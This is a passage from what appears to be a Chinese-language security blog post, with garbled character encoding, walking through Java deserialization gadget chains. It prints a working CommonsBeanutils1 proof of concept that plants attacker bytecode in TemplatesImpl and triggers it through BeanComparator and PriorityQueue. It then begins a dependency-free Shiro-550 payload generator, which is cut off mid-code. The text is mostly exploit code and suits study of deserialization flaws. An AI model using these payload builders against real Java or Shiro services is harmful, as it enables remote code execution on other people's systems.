&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æžœpropertyä¸ºç©ºåˆ™ç›´æŽ¥æ¯”è¾ƒå¯¹è±¡ï¼Œå¦åˆ™ç”¨getPropertyå–å‡ºå±žæ€§æ¯”è¾ƒï¼Œè°ƒç”¨å¯¹è±¡çš„getter&lt;/p>
&lt;p>å›žæƒ³å½“æ—¶TemplatesImplçš„è°ƒç”¨é“¾&lt;/p>
&lt;pre tabindex="0">&lt;code>TemplateImpl#getOutputProperties public
-&amp;gt; TemplateImpl#newTransformer public
-&amp;gt; TemplateImpl#getTransletInstance
-&amp;gt; TemplateImpl#defineTransletClasses
-&amp;gt; TemplateImpl#defineClass default
&lt;/code>&lt;/pre>&lt;p>æ³¨æ„åˆ°&lt;code>getOutputProperties&lt;/code>ï¼Œæ˜¯è§¦å‘åŽé¢çš„å…³é”®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">newTransformer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getOutputProperties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TransformerConfigurationException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®ƒå°±æ˜¯ä¸€ä¸ªgetterï¼è·Ÿå‰é¢çš„ç»“åˆèµ·æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“o1ä¸ºTemplatesImplå¯¹è±¡æ—¶ï¼Œå°±ä¼šè°ƒç”¨getOutputProperties&lt;/p>
&lt;p>æž„é€ é“¾å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="shiro-550æ— cc">Shiro-550(æ— cc&lt;/h3>
&lt;p>shiroæœ¬èº«çš„ä¾èµ–æ˜¯æœ‰cbçš„ï¼Œä½†æ˜¯ä¼šå› ä¸ºserialVersionUIDä¸ç¬¦è€ŒæŠ¥é”™ï¼Œå³ä½¿æˆ‘ä»¬è°ƒå¯¹ç”Ÿæˆpayloadçš„æœ¬åœ°ä¾èµ–ç‰ˆæœ¬å’Œç›®æ ‡çŽ¯å¢ƒä¸€è‡´ä¹Ÿä¼šå‡ºçŽ°ccä¾èµ–ç‰ˆæœ¬ä¸å¯¹çš„æƒ…å†µï¼Œæˆ‘ä»¬è®¾æƒ³ä¸€æ¡æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨é“¾&lt;/p>
&lt;p>åœ¨BeanComparatorçš„æž„é€ å‡½æ•°å¤„ï¼Œæ²¡æœ‰æ˜¾å¼ä¼ å…¥Comparatoræ—¶é»˜è®¤ä½¿ç”¨ccä¸­çš„ComparableComparatorï¼Œæ›¿ä»£ç±»éœ€è¦æ»¡è¶³è¿™æ ·çš„æ¡ä»¶ï¼š&lt;/p>
&lt;ul>
&lt;li>å®žçŽ°java.util.ComparatoræŽ¥å£&lt;/li>
&lt;li>å®žçŽ°java.io.SerializableæŽ¥å£&lt;/li>
&lt;li>æœ€å¥½è‡ªå¸¦ï¼Œå…¼å®¹æ€§å¼º&lt;/li>
&lt;/ul>
&lt;p>æˆ‘ä»¬æ‰¾åˆ°äº†java.util.Stringä¸­çš„å†…éƒ¨ç§æœ‰ç±»CaseInsesitiveComparatorï¼Œå®ƒå®žçŽ°äº†Comparatorå’ŒSerializable&lt;/p>
&lt;p>æ›¿æ¢exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">CASE_INSENSITIVE_ORDER&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
